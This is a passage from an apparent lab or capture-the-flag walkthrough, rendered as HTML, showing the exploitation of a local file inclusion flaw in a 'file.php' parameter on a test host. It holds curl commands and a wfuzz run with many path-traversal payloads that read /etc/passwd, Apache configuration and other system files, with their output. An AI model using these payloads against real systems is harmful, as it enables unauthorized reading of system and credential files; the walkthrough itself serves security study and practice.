+<span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">301</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">318</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">20</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">10</span><span class="p">,</span> <span class="n">Duration</span><span class="p">:</span> <span class="mi">30</span><span class="n">ms</span><span class="p">]</span>
+    <span class="o">*</span> <span class="n">FUZZ</span><span class="p">:</span> <span class="n">console</span>
+
+<span class="p">::</span> <span class="n">Progress</span><span class="p">:</span> <span class="p">[</span><span class="mi">2798</span><span class="o">/</span><span class="mi">30000</span><span class="p">]</span> <span class="p">::</span> <span class="n">Job</span> <span class="p">[</span><span class="mi">1</span><span class="o">/</span><span class="mi">1</span><span class="p">]</span> <span class="p">::</span> <span class="mi">1282</span> <span class="n">req</span><span class="o">/</span><span class="n">sec</span> <span class="p">::</span> <span class="n">Duration</span><span class="p">:</span> <span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">05</span><span class="p">]</span> <span class="p">::</span> <span class="n">Errors</span><span class="p">:</span> <span class="mi">0</span> <span class="p">::</span>
+</pre></div>
+</div>
+<p>There’s a <code class="docutils literal notranslate"><span class="pre">file.php</span></code> in there</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-i<span class="w"> </span>http://192.168.185.80/console/file.php
+HTTP/1.1<span class="w"> </span><span class="m">200</span><span class="w"> </span>OK
+Date:<span class="w"> </span>Fri,<span class="w"> </span><span class="m">18</span><span class="w"> </span>Aug<span class="w"> </span><span class="m">2023</span><span class="w"> </span><span class="m">17</span>:30:37<span class="w"> </span>GMT
+Server:<span class="w"> </span>Apache/2.4.29<span class="w"> </span><span class="o">(</span>Ubuntu<span class="o">)</span>
+Content-Length:<span class="w"> </span><span class="m">0</span>
+Content-Type:<span class="w"> </span>text/html<span class="p">;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>UTF-8
+</pre></div>
+</div>
+</section>
+<section id="lfi">
+<h2>LFI<a class="headerlink" href="#lfi" title="Permalink to this heading">#</a></h2>
+<p>Which predictably has an LFI in the file param</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-i<span class="w"> </span>http://192.168.185.80/console/file.php?file<span class="o">=</span>../../../../../etc/passwd
+HTTP/1.1<span class="w"> </span><span class="m">200</span><span class="w"> </span>OK
+Date:<span class="w"> </span>Fri,<span class="w"> </span><span class="m">18</span><span class="w"> </span>Aug<span class="w"> </span><span class="m">2023</span><span class="w"> </span><span class="m">17</span>:30:55<span class="w"> </span>GMT
+Server:<span class="w"> </span>Apache/2.4.29<span class="w"> </span><span class="o">(</span>Ubuntu<span class="o">)</span>
+Vary:<span class="w"> </span>Accept-Encoding
+Content-Length:<span class="w"> </span><span class="m">1398</span>
+Content-Type:<span class="w"> </span>text/html<span class="p">;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>UTF-8
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing<span class="w"> </span>List<span class="w"> </span>Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats<span class="w"> </span>Bug-Reporting<span class="w"> </span>System<span class="w"> </span><span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd<span class="w"> </span>Network<span class="w"> </span>Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd<span class="w"> </span>Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
+natraj:x:1000:1000:natraj,,,:/home/natraj:/bin/bash
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+mahakal:x:1001:1001:,,,:/home/mahakal:/bin/bash
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-s<span class="w"> </span>http://192.168.185.80/console/file.php?file<span class="o">=</span>../../../../../etc/passwd<span class="p">|</span>grep<span class="w"> </span>sh$
+root:x:0:0:root:/root:/bin/bash
+natraj:x:1000:1000:natraj,,,:/home/natraj:/bin/bash
+mahakal:x:1001:1001:,,,:/home/mahakal:/bin/bash
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-s<span class="w"> </span>http://192.168.185.80/console/file.php?file<span class="o">=</span>../../../../../etc/apache2/sites-enabled/000-default.conf
+&lt;VirtualHost<span class="w"> </span>*:80&gt;
+<span class="w">        </span><span class="c1"># The ServerName directive sets the request scheme, hostname and port that</span>
+<span class="w">        </span><span class="c1"># the server uses to identify itself. This is used when creating</span>
+<span class="w">        </span><span class="c1"># redirection URLs. In the context of virtual hosts, the ServerName</span>
+<span class="w">        </span><span class="c1"># specifies what hostname must appear in the request&#39;s Host: header to</span>
+<span class="w">        </span><span class="c1"># match this virtual host. For the default virtual host (this file) this</span>
+<span class="w">        </span><span class="c1"># value is not decisive as it is used as a last resort host regardless.</span>
+<span class="w">        </span><span class="c1"># However, you must set it for any further virtual host explicitly.</span>
+<span class="w">        </span><span class="c1">#ServerName www.example.com</span>
+
+<span class="w">        </span>ServerAdmin<span class="w"> </span>webmaster@localhost
+<span class="w">        </span>DocumentRoot<span class="w"> </span>/var/www/html
+
+<span class="w">        </span><span class="c1"># Available loglevels: trace8, ..., trace1, debug, info, notice, warn,</span>
+<span class="w">        </span><span class="c1"># error, crit, alert, emerg.</span>
+<span class="w">        </span><span class="c1"># It is also possible to configure the loglevel for particular</span>
+<span class="w">        </span><span class="c1"># modules, e.g.</span>
+<span class="w">        </span><span class="c1">#LogLevel info ssl:warn</span>
+
+<span class="w">        </span>ErrorLog<span class="w"> </span><span class="si">${</span><span class="nv">APACHE_LOG_DIR</span><span class="si">}</span>/error.log
+<span class="w">        </span>CustomLog<span class="w"> </span><span class="si">${</span><span class="nv">APACHE_LOG_DIR</span><span class="si">}</span>/access.log<span class="w"> </span>combined
+
+<span class="w">        </span><span class="c1"># For most configuration files from conf-available/, which are</span>
+<span class="w">        </span><span class="c1"># enabled or disabled at a global level, it is possible to</span>
+<span class="w">        </span><span class="c1"># include a line for only one particular virtual host. For example the</span>
+<span class="w">        </span><span class="c1"># following line enables the CGI configuration for this host only</span>
+<span class="w">        </span><span class="c1"># after it has been globally disabled with &quot;a2disconf&quot;.</span>
+<span class="w">        </span><span class="c1">#Include conf-available/serve-cgi-bin.conf</span>
+&lt;/VirtualHost&gt;
+
+<span class="c1"># vim: syntax=apache ts=4 sw=4 sts=4 sr noet</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-s<span class="w"> </span>http://192.168.185.80/console/file.php?file<span class="o">=</span>../../../../../etc/hosts
+<span class="m">127</span>.0.0.1<span class="w">       </span>localhost
+<span class="m">127</span>.0.1.1<span class="w">       </span>ubuntu
+
+<span class="c1"># The following lines are desirable for IPv6 capable hosts</span>
+::1<span class="w">     </span>localhost<span class="w"> </span>ip6-localhost<span class="w"> </span>ip6-loopback
+ff02::1<span class="w"> </span>ip6-allnodes
+ff02::2<span class="w"> </span>ip6-allrouters
+</pre></div>
+</div>
+<p>Automating the exploration process</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>wfuzz<span class="w"> </span>-c<span class="w"> </span>-w<span class="w"> </span>./lfi2.txt<span class="w"> </span>--hw<span class="w"> </span><span class="m">0</span><span class="w"> </span>http://192.168.185.80/console/file.php?file<span class="o">=</span>FUZZ
+********************************************************
+*<span class="w"> </span>Wfuzz<span class="w"> </span><span class="m">3</span>.1.0<span class="w"> </span>-<span class="w"> </span>The<span class="w"> </span>Web<span class="w"> </span>Fuzzer<span class="w">                         </span>*
+********************************************************
+
+Target:<span class="w"> </span>http://192.168.185.80/console/file.php?file<span class="o">=</span>FUZZ
+Total<span class="w"> </span>requests:<span class="w"> </span><span class="nv">2292</span>
+
+<span class="o">=====================================================================</span>
+ID<span class="w">           </span>Response<span class="w">   </span>Lines<span class="w">    </span>Word<span class="w">       </span>Chars<span class="w">       </span><span class="nv">Payload</span>
+<span class="o">=====================================================================</span>
+
+<span class="m">000000018</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">27</span><span class="w"> </span>L<span class="w">     </span><span class="m">35</span><span class="w"> </span>W<span class="w">       </span><span class="m">1398</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&quot;</span>
+<span class="m">000000016</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">27</span><span class="w"> </span>L<span class="w">     </span><span class="m">35</span><span class="w"> </span>W<span class="w">       </span><span class="m">1398</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd&quot;</span>
+<span class="m">000000092</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">27</span><span class="w"> </span>L<span class="w">     </span><span class="m">35</span><span class="w"> </span>W<span class="w">       </span><span class="m">1398</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;../../../../../../../../../../../../../../../../etc/passwd&quot;</span>
+<span class="m">000000084</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">27</span><span class="w"> </span>L<span class="w">     </span><span class="m">35</span><span class="w"> </span>W<span class="w">       </span><span class="m">1398</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;../../../../../../../../../../../../../../../../../etc/passwd&quot;</span>
+<span class="m">000000078</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">27</span><span class="w"> </span>L<span class="w">     </span><span class="m">35</span><span class="w"> </span>W<span class="w">       </span><span class="m">1398</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;../../../../../../../../../../../../../../../../../../etc/passwd&quot;</span>
+<span class="m">000000076</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">27</span><span class="w"> </span>L<span class="w">     </span><span class="m">35</span><span class="w"> </span>W<span class="w">       </span><span class="m">1398</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;../../../../../../../../../../../../../../../../../../../etc/passwd&quot;</span>
+<span class="m">000000074</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">27</span><span class="w"> </span>L<span class="w">     </span><span class="m">35</span><span class="w"> </span>W<span class="w">       </span><span class="m">1398</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;../../../../../../../../../../../../../../../../../../../../etc/passwd&quot;</span>
+<span class="m">000000072</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">27</span><span class="w"> </span>L<span class="w">     </span><span class="m">35</span><span class="w"> </span>W<span class="w">       </span><span class="m">1398</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;../../../../../../../../../../../../../../../../../../../../../etc/passwd&quot;</span>
+<span class="m">000000069</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">27</span><span class="w"> </span>L<span class="w">     </span><span class="m">35</span><span class="w"> </span>W<span class="w">       </span><span class="m">1398</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;../../../../../../../../../../../../../../../../../../../../../../etc/passwd&quot;</span>
+<span class="m">000000116</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">27</span><span class="w"> </span>L<span class="w">     </span><span class="m">35</span><span class="w"> </span>W<span class="w">       </span><span class="m">1398</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;../../../../../../../../../../../../../../../etc/passwd&quot;</span>
+<span class="m">000000199</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">27</span><span class="w"> </span>L<span class="w">     </span><span class="m">35</span><span class="w"> </span>W<span class="w">       </span><span class="m">1398</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;../../../../../../../../../../../../../../etc/passwd&quot;</span>
+<span class="m">000000198</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">54</span><span class="w"> </span>L<span class="w">     </span><span class="m">54</span><span class="w"> </span>W<span class="w">       </span><span class="m">743</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;../../../../../../../../../../../../../../etc/group&quot;</span>
+<span class="m">000000241</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">27</span><span class="w"> </span>L<span class="w">     </span><span class="m">35</span><span class="w"> </span>W<span class="w">       </span><span class="m">1398</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;../../../../../../../../../../../etc/passwd&quot;</span>
+<span class="m">000000240</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">54</span><span class="w"> </span>L<span class="w">     </span><span class="m">54</span><span class="w"> </span>W<span class="w">       </span><span class="m">743</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;../../../../../../../../../../../etc/group&quot;</span>
+<span class="m">000000226</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">27</span><span class="w"> </span>L<span class="w">     </span><span class="m">35</span><span class="w"> </span>W<span class="w">       </span><span class="m">1398</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;../../../../../../../../../../../../etc/passwd&quot;</span>
+<span class="m">000000224</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">7</span><span class="w"> </span>L<span class="w">      </span><span class="m">22</span><span class="w"> </span>W<span class="w">       </span><span class="m">186</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;../../../../../../../../../../../../etc/hosts&quot;</span>
+<span class="m">000000223</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">54</span><span class="w"> </span>L<span class="w">     </span><span class="m">54</span><span class="w"> </span>W<span class="w">       </span><span class="m">743</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;../../../../../../../../../../../../etc/group&quot;</span>
+<span class="m">000000210</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">27</span><span class="w"> </span>L<span class="w">     </span><span class="m">35</span><span class="w"> </span>W<span class="w">       </span><span class="m">1398</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;../../../../../../../../../../../../../etc/passwd&quot;</span>
+<span class="m">000000209</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">54</span><span class="w"> </span>L<span class="w">     </span><span class="m">54</span><span class="w"> </span>W<span class="w">       </span><span class="m">743</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;../../../../../../../../../../../../../etc/group&quot;</span>
+<span class="m">000000253</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">54</span><span class="w"> </span>L<span class="w">     </span><span class="m">54</span><span class="w"> </span>W<span class="w">       </span><span class="m">743</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;../../../../../../../../../../etc/group&quot;</span>
+<span class="m">000000281</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">27</span><span class="w"> </span>L<span class="w">     </span><span class="m">35</span><span class="w"> </span>W<span class="w">       </span><span class="m">1398</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;../../../../../../../../etc/passwd&quot;</span>
+<span class="m">000000300</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">27</span><span class="w"> </span>L<span class="w">     </span><span class="m">35</span><span class="w"> </span>W<span class="w">       </span><span class="m">1398</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;../../../../../../../etc/passwd&quot;</span>
+<span class="m">000000295</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">54</span><span class="w"> </span>L<span class="w">     </span><span class="m">54</span><span class="w"> </span>W<span class="w">       </span><span class="m">743</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;../../../../../../../etc/group&quot;</span>
+<span class="m">000000280</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">54</span><span class="w"> </span>L<span class="w">     </span><span class="m">54</span><span class="w"> </span>W<span class="w">       </span><span class="m">743</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;../../../../../../../../etc/group&quot;</span>
+<span class="m">000000267</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">27</span><span class="w"> </span>L<span class="w">     </span><span class="m">35</span><span class="w"> </span>W<span class="w">       </span><span class="m">1398</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;../../../../../../../../../etc/passwd&quot;</span>
+<span class="m">000000266</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">54</span><span class="w"> </span>L<span class="w">     </span><span class="m">54</span><span class="w"> </span>W<span class="w">       </span><span class="m">743</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;../../../../../../../../../etc/group&quot;</span>
+<span class="m">000000254</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">27</span><span class="w"> </span>L<span class="w">     </span><span class="m">35</span><span class="w"> </span>W<span class="w">       </span><span class="m">1398</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;../../../../../../../../../../etc/passwd&quot;</span>
+<span class="m">000000337</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">27</span><span class="w"> </span>L<span class="w">     </span><span class="m">35</span><span class="w"> </span>W<span class="w">       </span><span class="m">1398</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;../../../../../../etc/passwd&amp;=%3C%3C%3C%3C&quot;</span>
+<span class="m">000000335</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">27</span><span class="w"> </span>L<span class="w">     </span><span class="m">35</span><span class="w"> </span>W<span class="w">       </span><span class="m">1398</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;../../../../../../etc/passwd&quot;</span>
+<span class="m">000000334</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">54</span><span class="w"> </span>L<span class="w">     </span><span class="m">54</span><span class="w"> </span>W<span class="w">       </span><span class="m">743</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;../../../../../../etc/group&quot;</span>
+<span class="m">000000357</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">27</span><span class="w"> </span>L<span class="w">     </span><span class="m">35</span><span class="w"> </span>W<span class="w">       </span><span class="m">1398</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;../../../../../etc/passwd&quot;</span>
+<span class="m">000000390</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">54</span><span class="w"> </span>L<span class="w">     </span><span class="m">54</span><span class="w"> </span>W<span class="w">       </span><span class="m">743</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;../../../../etc/group&quot;</span>
+<span class="m">000000391</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">27</span><span class="w"> </span>L<span class="w">     </span><span class="m">35</span><span class="w"> </span>W<span class="w">       </span><span class="m">1398</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;../../../../etc/passwd&quot;</span>
+<span class="m">000000352</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">54</span><span class="w"> </span>L<span class="w">     </span><span class="m">54</span><span class="w"> </span>W<span class="w">       </span><span class="m">743</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;../../../../../etc/group&quot;</span>
+<span class="m">000000596</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">27</span><span class="w"> </span>L<span class="w">     </span><span class="m">35</span><span class="w"> </span>W<span class="w">       </span><span class="m">1398</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/./././././././././././etc/passwd&quot;</span>
+<span class="m">000000583</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">27</span><span class="w"> </span>L<span class="w">     </span><span class="m">35</span><span class="w"> </span>W<span class="w">       </span><span class="m">1398</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/../../../../../../../../../../etc/passwd&quot;</span>
+<span class="m">000000570</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">27</span><span class="w"> </span>L<span class="w">     </span><span class="m">35</span><span class="w"> </span>W<span class="w">       </span><span class="m">1398</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd&quot;</span>
+<span class="m">000000614</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">27</span><span class="w"> </span>L<span class="w">     </span><span class="m">35</span><span class="w"> </span>W<span class="w">       </span><span class="m">1398</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;///////../../../etc/passwd&quot;</span>
+<span class="m">000000701</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">194</span><span class="w"> </span>L<span class="w">    </span><span class="m">599</span><span class="w"> </span>W<span class="w">      </span><span class="m">5574</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/boot/grub/grub.cfg&quot;</span>
+<span class="m">000000754</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">31</span><span class="w"> </span>L<span class="w">     </span><span class="m">197</span><span class="w"> </span>W<span class="w">      </span><span class="m">1332</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/etc/apache2/sites-enabled/000-default.conf&quot;</span>
+<span class="m">000000750</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">15</span><span class="w"> </span>L<span class="w">     </span><span class="m">46</span><span class="w"> </span>W<span class="w">       </span><span class="m">320</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/etc/apache2/ports.conf&quot;</span>
+<span class="m">000000749</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">29</span><span class="w"> </span>L<span class="w">     </span><span class="m">102</span><span class="w"> </span>W<span class="w">      </span><span class="m">749</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/etc/apache2/mods-enabled/status.conf&quot;</span>
+<span class="m">000000747</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">20</span><span class="w"> </span>L<span class="w">     </span><span class="m">124</span><span class="w"> </span>W<span class="w">      </span><span class="m">724</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/etc/apache2/mods-enabled/negotiation.conf&quot;</span>
+<span class="m">000000746</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">251</span><span class="w"> </span>L<span class="w">    </span><span class="m">1128</span><span class="w"> </span>W<span class="w">     </span><span class="m">7676</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/etc/apache2/mods-enabled/mime.conf&quot;</span>
+<span class="m">000000744</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">10</span><span class="w"> </span>L<span class="w">     </span><span class="m">31</span><span class="w"> </span>W<span class="w">       </span><span class="m">395</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/etc/apache2/mods-enabled/deflate.conf&quot;</span>
+<span class="m">000000743</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">24</span><span class="w"> </span>L<span class="w">     </span><span class="m">131</span><span class="w"> </span>W<span class="w">      </span><span class="m">843</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/etc/apache2/mods-enabled/alias.conf&quot;</span>
+<span class="m">000000742</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">85</span><span class="w"> </span>L<span class="w">     </span><span class="m">442</span><span class="w"> </span>W<span class="w">      </span><span class="m">3110</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/etc/apache2/mods-available/ssl.conf&quot;</span>
+<span class="m">000000745</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">5</span><span class="w"> </span>L<span class="w">      </span><span class="m">18</span><span class="w"> </span>W<span class="w">       </span><span class="m">157</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/etc/apache2/mods-enabled/dir.conf&quot;</span>
+<span class="m">000000741</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">32</span><span class="w"> </span>L<span class="w">     </span><span class="m">139</span><span class="w"> </span>W<span class="w">      </span><span class="m">1280</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/etc/apache2/mods-available/setenvif.conf&quot;</span>
+<span class="m">000000740</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">27</span><span class="w"> </span>L<span class="w">     </span><span class="m">139</span><span class="w"> </span>W<span class="w">      </span><span class="m">822</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/etc/apache2/mods-available/proxy.conf&quot;</span>
+<span class="m">000000737</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">5</span><span class="w"> </span>L<span class="w">      </span><span class="m">18</span><span class="w"> </span>W<span class="w">       </span><span class="m">157</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/etc/apache2/mods-available/dir.conf&quot;</span>
+<span class="m">000000739</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">251</span><span class="w"> </span>L<span class="w">    </span><span class="m">1128</span><span class="w"> </span>W<span class="w">     </span><span class="m">7676</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/etc/apache2/mods-available/mime.conf&quot;</span>
+<span class="m">000000736</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">10</span><span class="w"> </span>L<span class="w">     </span><span class="m">31</span><span class="w"> </span>W<span class="w">       </span><span class="m">395</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/etc/apache2/mods-available/deflate.conf&quot;</span>
+<span class="m">000000735</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">96</span><span class="w"> </span>L<span class="w">     </span><span class="m">392</span><span class="w"> </span>W<span class="w">      </span><span class="m">3374</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/etc/apache2/mods-available/autoindex.conf&quot;</span>
+<span class="m">000000731</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">47</span><span class="w"> </span>L<span class="w">     </span><span class="m">227</span><span class="w"> </span>W<span class="w">      </span><span class="m">1782</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/etc/apache2/envvars&quot;</span>
+<span class="m">000000724</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">227</span><span class="w"> </span>L<span class="w">    </span><span class="m">1115</span><span class="w"> </span>W<span class="w">     </span><span class="m">7224</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/etc/apache2/apache2.conf&quot;</span>
+<span class="m">000000712</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">88</span><span class="w"> </span>L<span class="w">     </span><span class="m">467</span><span class="w"> </span>W<span class="w">      </span><span class="m">3028</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/etc/adduser.conf&quot;</span>
+<span class="m">000000788</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">15</span><span class="w"> </span>L<span class="w">     </span><span class="m">124</span><span class="w"> </span>W<span class="w">      </span><span class="m">722</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/etc/crontab&quot;</span>
+<span class="m">000000804</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">54</span><span class="w"> </span>L<span class="w">     </span><span class="m">207</span><span class="w"> </span>W<span class="w">      </span><span class="m">1735</span><span class="w"> </span>Ch<span class="w">     </span><span class="s2">&quot;/etc/dhcp/dhclient.conf&quot;</span>
+<span class="m">000000803</span>:<span class="w">   </span><span class="m">200</span><span class="w">        </span><span class="m">20</span><span class="w"> </span>L<span class="w">     </span><span class="m">99</span><span class="w"> </span>W<span class="w">       </span><span class="m">604</span><span class="w"> </span>Ch<span class="w">      </span><span class="s2">&quot;/etc/deluser.conf&quot;</span>
